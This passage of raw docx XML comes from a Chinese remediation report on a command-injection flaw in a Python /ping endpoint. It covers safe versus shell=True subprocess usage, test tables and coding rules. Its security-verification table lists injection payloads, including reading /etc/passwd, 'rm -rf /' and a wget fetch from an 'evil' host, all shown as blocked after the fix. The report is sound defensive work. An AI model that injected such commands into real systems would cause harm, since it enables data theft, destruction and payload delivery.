        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>失败时返回完整错误信息 + 错误码</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.4 安全的命令执行模式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="008800"/>
        </w:rPr>
        <w:t>✅ 推荐模式（参数列表，无 shell）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="008800"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 每个参数作为列表元素传递</w:t>
        <w:br/>
        <w:t>subprocess.check_output(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ["ping", "-c", "3", user_input],  # 参数列表</w:t>
        <w:br/>
        <w:t xml:space="preserve">    timeout=30,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    stderr=subprocess.STDOUT</w:t>
        <w:br/>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC0000"/>
        </w:rPr>
        <w:t>❌ 危险模式（字符串拼接 + shell=True）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="CC0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 绝对禁止：f-string + shell=True</w:t>
        <w:br/>
        <w:t>subprocess.check_output(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    f"ping -c 3 {user_input}",  # 字符串拼接</w:t>
        <w:br/>
        <w:t xml:space="preserve">    shell=True                   # 经 shell 解析</w:t>
        <w:br/>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>六、修复验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 功能验证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测试项</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>预期结果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正常 IP：8.8.8.8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>返回 3 次 ping 结果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正常域名：baidu.com</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>返回域名 ping 结果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回环地址：127.0.0.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>返回本地 ping 结果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GET 请求访问 /ping</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>显示 Ping 测试页面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  <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>未登录访问 /ping</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>跳转到登录页</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 安全验证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攻击载荷</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>修复前</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>修复后</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>8.8.8.8;id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 执行 id 命令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127.0.0.1|cat /etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 读取 /etc/passwd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0.0.0.0&amp;rm -rf /</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 危险命令执行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localhost`whoami`</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 反引号执行 whoami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8.8.8.8$(cat /etc/hostname)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ $() 子命令执行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8.8.8.8;wget http://evil/payload</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 下载恶意文件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8.8.8.8;bash -c "id"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ bash 执行命令</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 拒绝：非法字符</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>a.b.c.d</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 传递给 ping 执行</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 拒绝：无效 IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 代码检查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检查项</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>结果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原文中无 shell=True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subprocess.check_output 已移除 shell=True</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>原文中无 f-string 命令拼接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使用 ["ping", "-c", "3", ip] 参数列表</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>输入合法性校验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_validate_ip_or_domain() 白名单校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>危险关键词拦截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黑名单关键词检测</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>超时控制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timeout=30 秒</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Python 语法检查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py_compile 通过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七、安全编码规范建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 黄金法则：永远不要 shell=True + 字符串拼接</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>subprocess 的安全使用只有一种正确方式：参数列表 + 不指定 shell=True。当传递参数列表时，subprocess 直接使用 os.execvp() 执行程序，不经过 shell 解析，用户输入即使包含 shell 元字符也不会造成命令注入。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 如需使用 shell=True 的安全做法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>如果确实需要使用 shell 特性（如管道、通配符扩展等），必须：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>不要拼接用户输入到命令字符串中</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>使用 shlex.quote() 对用户输入进行转义</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>尽量用 Python 代码替代 shell 功能（如 os.listdir() 替代 ls，glob 替代通配符等）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3 Python 命令执行安全对照表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函数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>安全用法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subprocess.run()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>subprocess.run(["ping", ip])</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>参数列表 ✅ 安全</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>subprocess.call()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>subprocess.call(["ping", ip])</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>参数列表 ✅ 安全</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>subprocess.check_output()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>subprocess.check_output(["ping", ip])</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>参数列表 ✅ 安全</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>os.system()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>os.system(f"ping {ip}")</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 危险：无条件 shell</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>os.popen()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>os.popen(f"ping {ip}")</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 危险：无条件 shell</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 命令注入防御检查清单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>所有 subprocess/ os.system 调用是否使用了参数列表形式？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>是否设置了 shell=False（默认值）？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>是否对用户输入进行了输入校验（白名单优先）？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>是否设置了 timeout 超时防止拒绝服务？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>即使使用了参数列表，参数是否包含可能被程序误解的字符？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>是否最小化了命令执行权限？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>八、修复变更清单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文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>变更内容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新增 _validate_ip_or_domain() 输入校验函数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>白名单+黑名单双层校验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/ping 路由：移除 f-string 命令拼接</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>改为参数列表 ["ping", "-c", "3", ip]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/ping 路由：移除 shell=True</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>禁用 shell 解析，杜绝元字符注入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/ping 路由：新增错误提示 error 参数传递到模板</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>用户获得清晰的错误反馈</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本次 /ping 命令注入漏洞的修复采取了系统性的防御策略。第一，通过 _validate_ip_or_domain() 函数对用户输入进行白名单字符校验 + 危险关键词拦截，在前端和后端双重确保输入合法性。第二，也是最关键的修复，将命令执行方式从 shell=True + 字符串拼接改为参数列表形式直接执行，从根本上消除了 shell 注入的可能。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>此漏洞的典型性在于它展示了"功能性需求"与"安全性需求"的冲突。从功能角度看，f"ping -c 3 {ip}" 是最直观、最简短的实现方式；但从安全角度看，这恰恰是最危险的写法。建议将"禁止使用 shell=True + 字符串拼接"纳入项目安全编码规范中的红线条款。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